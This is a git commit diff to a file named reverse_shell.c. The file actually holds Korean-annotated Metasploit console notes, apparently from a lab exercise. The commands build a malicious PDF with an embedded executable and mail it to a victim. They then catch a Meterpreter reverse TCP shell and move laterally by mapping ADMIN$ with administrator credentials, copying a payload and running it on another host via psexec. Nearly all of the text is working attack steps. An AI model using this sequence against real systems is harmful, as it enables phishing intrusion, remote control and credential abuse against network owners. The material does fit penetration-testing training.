1efc998f8e79adf3320dccfb117fc70419cbb3c5
witcher42 <59954400+witcher42@users.noreply.github.com>
2020-06-14 13:53:36 +0900

    added

--- reverse_shell.c
+++ reverse_shell.c
@@ -7,11 +7,26 @@ msf exploit(adobe_pdf_embedded_exe) > set lhost 192.168.57.10
 msf exploit(adobe_pdf_embedded_exe) > set lport 443  
 msf exploit(adobe_pdf_embedded_exe) > exploit  
 msf exploit(adobe_pdf_embedded_exe) > use multi/handler  
-pdf를 메일로 전송   
-victim에서 실행하여 악성파일 추가 생성후 대기  
+PDF를 메일로 전송   
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  
 msf exploit(handler) > set lhost 192.168.57.10  
 msf exploit(handler) > set lport 443  
 msf exploit(handler) > exploit  
+victim에서 메일 첨부파일을 실행하면 PDF악성파일이 추가로 생성된다.
+이후 연결대기... 접속되면 다음과 같이 입력하여 측면공격 수행.
 meterpreter > shell  
-이후 tai32.exe 등으로 측면공격 수행  
+C:\> net use Z: \\192.168.56.60\ADMIN$ Password1! /U: LAB\administrator
+C:\> Z:
+Z:\> copy C:\Users\Users1.LAB\Desktop\tools\tai32.exe .\
+새로운 터미널
+msfconsole  
+msf > use exploit/multi/handler
+msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp  
+msf exploit(multi/handler) > set lhost 192.168.57.10  
+msf exploit(multi/handler) > set lport 8080  
+msf exploit(multi/handler) > exploit  
+다시 이전 터미널로 돌아가서,
+Z:\> C:
+C:\Users\Users1.LAB\Desktop\tools\> psexec -accepteula -U administrator -p P@ssword1! \\USER2 lab.example.com -s -d cmd.exe /c "c:\Windows\Temp\tai32.exe"
+
+
